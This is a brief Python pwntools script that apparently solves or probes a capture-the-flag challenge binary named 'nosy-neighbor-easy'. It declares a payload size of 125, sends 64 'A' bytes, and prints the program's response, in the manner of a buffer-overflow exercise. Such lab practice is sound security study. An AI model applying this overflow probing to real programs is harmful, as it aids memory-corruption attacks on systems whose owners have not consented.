from pwn import *


p = process('/challenge/nosy-neighbor-easy')

output = p.recvuntil(b"Payload size:").decode()

p.sendline(b'125')

payload = b'A' * 64

p.recvuntil('Send your payload')

p.send(payload)

str = p.recvall(1)
print(str)
